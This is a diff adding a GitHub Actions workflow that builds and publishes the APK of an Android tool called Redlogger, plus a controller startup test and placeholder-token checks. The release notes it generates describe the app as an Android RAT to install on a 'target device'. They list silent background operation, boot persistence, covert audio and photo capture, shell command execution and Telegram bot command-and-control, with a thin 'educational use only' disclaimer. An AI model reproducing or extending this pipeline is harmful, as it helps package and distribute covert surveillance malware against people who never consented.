@@ -1,0 +1,164 @@
+name: Build Android APK
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+
+    - name: Set up Java
+      uses: actions/setup-java@v3
+      with:
+        distribution: 'temurin'
+        java-version: '17'
+
+    - name: Install system dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
+
+    - name: Install Python dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install buildozer cython
+
+    - name: Cache Buildozer global directory
+      uses: actions/cache@v3
+      with:
+        path: ~/.buildozer
+        key: buildozer-${{ runner.os }}-${{ hashFiles('redlogger_client/buildozer.spec') }}
+
+    - name: Cache Buildozer dependencies
+      uses: actions/cache@v3
+      with:
+        path: redlogger_client/.buildozer
+        key: buildozer-deps-${{ runner.os }}-${{ hashFiles('redlogger_client/buildozer.spec') }}
+
+    - name: Build Android APK
+      working-directory: redlogger_client
+      run: |
+        buildozer android debug
+
+    - name: Upload APK artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: redlogger-debug-apk
+        path: redlogger_client/bin/*.apk
+
+    - name: Create Release (on tag)
+      if: startsWith(github.ref, 'refs/tags/')
+      uses: softprops/action-gh-release@v1
+      with:
+        files: redlogger_client/bin/*.apk
+        name: Redlogger ${{ github.ref_name }}
+        body: |
+          ## Redlogger Android RAT - Release ${{ github.ref_name }}
+          
+          ### 📱 APK Download
+          Download the APK file below and install it on your target Android device.
+          
+          ### ⚠️ Educational Use Only
+          This tool is for educational and authorized penetration testing purposes only.
+          
+          ### 🔧 Setup Instructions
+          1. Download the APK
+          2. Configure your Telegram bot token and chat ID
+          3. Set up your No-IP domain (optional)
+          4. Install on target device
+          5. Start the controller server
+          
+          ### 📋 Features
+          - Silent background operation
+          - Boot persistence
+          - Device information collection
+          - Audio recording
+          - Photo capture
+          - File management
+          - Shell command execution
+          - Telegram Bot C2
+          - No-IP DDNS support
+        draft: false
+        prerelease: false
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  test-controller:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+
+    - name: Install controller dependencies
+      working-directory: controller/redlogger_controller
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+
+    - name: Test controller startup
+      working-directory: controller/redlogger_controller
+      run: |
+        # Test that the controller can start without errors
+        timeout 10s python src/main.py || true
+        echo "Controller startup test completed"
+
+  security-scan:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Run security scan
+      uses: securecodewarrior/github-action-add-sarif@v1
+      with:
+        sarif-file: 'security-scan-results.sarif'
+      continue-on-error: true
+
+    - name: Check for hardcoded secrets
+      run: |
+        echo "Checking for hardcoded secrets..."
+        if grep -r "YOUR_TELEGRAM_BOT_TOKEN\|YOUR_TELEGRAM_CHAT_ID\|YOUR_NOIP_URL" . --exclude-dir=.git; then
+          echo "⚠️ Found placeholder tokens - make sure to replace them before use"
+        else
+          echo "✅ No placeholder tokens found"
+        fi
+
+    - name: Validate buildozer.spec
+      run: |
+        echo "Validating buildozer.spec..."
+        if [ -f "redlogger_client/buildozer.spec" ]; then
+          echo "✅ buildozer.spec found"
+          # Check for required permissions
+          if grep -q "INTERNET" redlogger_client/buildozer.spec; then
+            echo "✅ INTERNET permission found"
+          else
+            echo "❌ INTERNET permission missing"
+            exit 1
+          fi
+        else
+          echo "❌ buildozer.spec not found"
+          exit 1
+        fi
+
